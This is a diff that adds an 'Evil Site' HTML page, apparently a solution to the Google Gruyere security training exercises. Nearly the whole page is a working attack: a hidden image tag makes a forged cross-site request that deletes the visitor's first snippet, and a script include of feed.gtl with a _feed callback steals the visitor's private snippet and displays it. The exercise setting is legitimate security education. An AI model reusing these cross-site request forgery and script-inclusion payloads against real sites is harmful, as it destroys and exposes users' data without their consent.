@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Evil Site</title>
+</head>
+<body>
+	<h1>Welcome to the Evil Site!</h1>
+	<img src="https://google-gruyere.appspot.com/465267470788093545021219698225806433597/deletesnippet?index=0" style="display:none" />
+	<!-- <img src="http://localhost:8009/664168879278511367648508244669682105364/deletesnippet?index=0" style="display:none" /> -->
+	<br>
+	<h2>Your private snippet is:</h2>
+	<textarea id="snippet" style="width:500px;height:100px;"></textarea>
+	<br>
+	<h2>Also to note: Your first snippet has been deleted.</h2>
+</body>
+<script>
+function _feed(s) {
+	document.getElementById("snippet").textContent = s['private_snippet'];
+}
+</script>
+<script src="https://google-gruyere.appspot.com/465267470788093545021219698225806433597/feed.gtl"></script>
+<script src="http://localhost:8009/664168879278511367648508244669682105364/feed.gtl"></script>
+</html>
